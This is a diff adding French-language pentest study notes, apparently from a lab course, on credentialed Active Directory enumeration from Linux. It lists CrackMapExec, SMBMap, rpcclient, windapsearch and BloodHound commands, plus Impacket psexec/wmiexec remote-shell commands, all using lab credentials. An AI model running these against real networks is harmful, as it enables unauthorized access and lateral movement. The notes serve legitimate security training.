@@ -611,5 +611,85 @@ Lister les machines avec LAPS et les mots de passe si notre user a le droit :
 
 ---
 
+# Credentialed Enumeration - from Linux
+
+## 1. CrackMapExec (CME)
+
+**Présentation :**
+- Outil AD multifonctions, très utilisé.
+- Prend en charge SMB, MSSQL, WinRM, SSH.
+- Toujours checker les options avec `crackmapexec -h` et `crackmapexec smb -h`.
+
+### Enumérer tous les utilisateurs du domaine :
+`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`
+
+### Enumérer tous les groupes du domaine :
+`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`
+
+### Voir les utilisateurs connectés sur une machine cible :
+`sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users`
+
+### Enumérer les partages et leurs droits :
+`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`
+
+### Lister tous les fichiers lisibles d’un partage :
+`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'`
+
+## 2. SMBMap
+
+Outil pour lister et explorer les shares SMB, permet aussi de télécharger des fichiers.
+
+### Lister les shares et permissions :
+`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`
+
+### Lister récursivement les dossiers d’un partage :
+`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`
+
+## 3. rpcclient
+
+Outil Samba polyvalent pour interroger MS-RPC et AD.
+
+### Connexion anonyme (si possible) :
+`rpcclient -U "" -N 172.16.5.5`
+
+### Enumérer tous les utilisateurs (avec leur RID) :
+`enumdomusers`
+
+### Extraire les infos détaillées d’un utilisateur (par RID) :
+`queryuser 0x457`
+
+## 4. Impacket Toolkit
+
+**Exemples :**
+
+### Exécution de commande SYSTEM à distance (psexec.py) :
+`psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`
+
+### Shell WMI sans drop de fichier (plus stealth, wmiexec.py) :
+`wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`
+
+## 5. Windapsearch
+
+Python script pour énumérer via LDAP (users, groupes, etc.).
+
+### Enumérer les Domain Admins :
+`python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da`
+
+### Enumérer les users privilégiés (nested) :
+`python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU`
+
+## 6. BloodHound (bloodhound-python)
+
+Permet de collecter toutes les relations AD pour générer des graphes d’attaque.
+
+### Collecte complète depuis Kali/Parrot :
+`sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`
+
+- Les JSON générés s’importent dans le client GUI BloodHound (`bloodhound`) après avoir démarré Neo4j (`sudo neo4j start`).
+- Utiliser ensuite l’onglet "Analysis" pour trouver les chemins d’escalade, relations, etc.
+- On peux aussi zipper tous les .json d’un coup : `zip -r ilfreight_bh.zip *.json`
+
+---
+
 
 
